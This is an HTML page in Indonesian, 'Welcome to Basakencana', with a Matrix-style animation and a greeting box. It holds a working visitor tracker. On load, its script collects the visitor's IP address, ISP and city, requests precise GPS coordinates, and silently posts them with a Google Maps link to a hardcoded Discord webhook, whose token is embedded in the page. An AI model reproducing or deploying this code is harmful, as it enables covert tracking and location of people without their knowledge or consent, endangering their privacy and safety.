<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Basakencana</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { margin: 0; background: black; color: #0F0; font-family: monospace; overflow: hidden; }
        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
        #info { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; background: rgba(0,0,0,0.9); padding: 20px; border: 2px solid #0F0; border-radius: 8px; width: 320px; z-index: 10; }
        #map { height: 200px; width: 100%; margin-top: 15px; border: 1px solid #0F0; border-radius: 4px; background: #111; }
    </style>
</head>
<body>

<div id="info">
    <h2>SELAMAT DATANG DI BASAKENCANA</h2>
    <p id="status">Sistem Sedang Memindai...</p>
    <p id="ip"></p>
    <p id="location"></p>
    <div id="map"></div>
</div>

<canvas id="matrix"></canvas>

<script>
// CONFIG
const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8dj5XnVckc7du-HRYBFKAvdcxZ9jXcZqjJ_5G4hWa1rX0GUPVQ02P5as6o1Ok0xR";

// MATRIX BACKGROUND
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth; canvas.height = window.innerHeight;
const letters = "0101010101ABCDEF";
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
    drops.forEach((y, i) => {
        const text = letters[Math.floor(Math.random() * letters.length)];
        ctx.fillText(text, i * fontSize, y * fontSize);
        if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    });
}
setInterval(drawMatrix, 40);

// TRACKER FUNCTION
async function trackVisitor() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        
        document.getElementById('status').innerText = "Pengunjung Terdeteksi!";
        document.getElementById('ip').innerText = "IP: " + data.ip;
        document.getElementById('location').innerText = "Lokasi: " + data.city + ", " + data.country_name;

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                // Tampilkan Map
                var map = L.map('map').setView([lat, lon], 15);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                L.marker([lat, lon]).addTo(map).bindPopup("Lokasi Kamu").openPopup();

                await sendToDiscord(data, mLink, "🎯 AKURAT (GPS)");
            }, async () => {
                const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                await sendToDiscord(data, mLink, "☁️ ESTIMASI (IP)");
            });
        }
    } catch (err) { console.error(err); }
}

async function sendToDiscord(data, mapsLink, metode) {
    const payload = {
        username: "BASAKENCANA TRACKER",
        embeds: [{
            title: "🚨 PENGUNJUNG BARU!",
            color: 65280,
            fields: [
                { name: "🌐 IP Address", value: `**${data.ip}**`, inline: true },
                { name: "📡 ISP", value: data.org, inline: true },
                { name: "📍 Lokasi", value: `${data.city}, ${data.region}`, inline: false },
                { name: "🎯 Metode", value: metode, inline: true },
                { name: "🗺️ Google Maps", value: `[Klik di Sini](${mapsLink})`, inline: false }
            ],
            timestamp: new Date()
        }]
    };
    await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
}

trackVisitor();
</script>
</body>
</html>
